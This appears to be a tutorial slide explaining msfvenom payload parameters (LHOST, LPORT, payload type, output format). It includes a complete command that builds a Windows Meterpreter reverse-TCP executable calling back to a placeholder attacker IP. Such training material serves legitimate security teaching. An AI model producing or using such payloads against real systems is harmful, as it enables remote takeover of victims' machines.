Payload Parameters

Configuring Your Payload

Understanding LHOST, LPORT, and output formats

Key Parameters Explained

  • 1
    Payload (`-p`): The actual code to run on the target. Defines the objective (e.g., shell, Meterpreter).
  • 2
    LHOST (Local Host): Your attacker machine's IP address. The victim connects back here.
  • 3
    LPORT (Local Port): The port on your attacker machine listening for the connection.
  • 4
    Format (`-f`): The output file type (e.g., `exe`, `raw`, `vba`). Dictates how the payload is packaged.
Common Mistake

Forgetting that LHOST and LPORT refer to the *attacker's* machine, not the victim's. Incorrect settings will prevent a connection.

Example: Windows Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp 
         LHOST=<YOUR_ATTACKER_IP> 
         LPORT=4444 
         -f exe 
         -o /tmp/malicious.exe

This command generates a Windows executable:

  • • Payload: windows/meterpreter/reverse_tcp (Meterpreter shell, reverse connection).
  • • LHOST: Your IP address.
  • • LPORT: Port 4444.
  • • Format: exe (Windows executable).
  • • Output: /tmp/malicious.exe.
Key Takeaway

Accurate configuration of payload type, LHOST, LPORT, and output format is paramount for successful payload generation and connection establishment.
